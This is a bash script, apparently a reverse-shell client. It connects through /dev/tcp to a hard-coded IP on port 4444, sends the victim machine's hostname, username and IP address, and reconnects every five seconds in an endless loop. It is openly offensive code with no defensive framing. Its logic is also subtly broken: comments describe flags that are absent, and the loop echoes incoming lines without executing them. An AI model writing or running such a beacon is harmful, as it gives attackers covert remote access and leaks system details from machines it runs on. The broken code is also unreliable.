#!/bin/bash

# Configuration
TARGET_IP="172.16.10.171"
TARGET_PORT=4444
SHELL="/bin/bash"

# Function to execute the reverse shell
exec_shell() {
    # Check if the target is reachable
    # if ! ping -c 1 -W 1 $TARGET_IP > /dev/null; then
    #     return
    # fi

    # The actual reverse shell
    # The -i flag makes it interactive, -l makes it login (loads profile)
    exec 3<> /dev/tcp/$TARGET_IP/$TARGET_PORT
    cat >&3
    # Send environment info
    echo "[*] Connected from: $(hostname) | User: $(whoami) | IP: $(hostname -I | awk '{print $1}')" >&3
    # Bidirectional communication
    while IFS= read -r line; do
        if [[ "$line" == "EXIT" ]]; then
            break
        fi
        echo -e "$line" >&3
    done <&3
    # Close the connection
    exec 3>&-
}

# Main loop with retry logic
while true; do
    exec_shell
    echo "Connection lost. Retrying in 5 seconds..."
    sleep 5
done
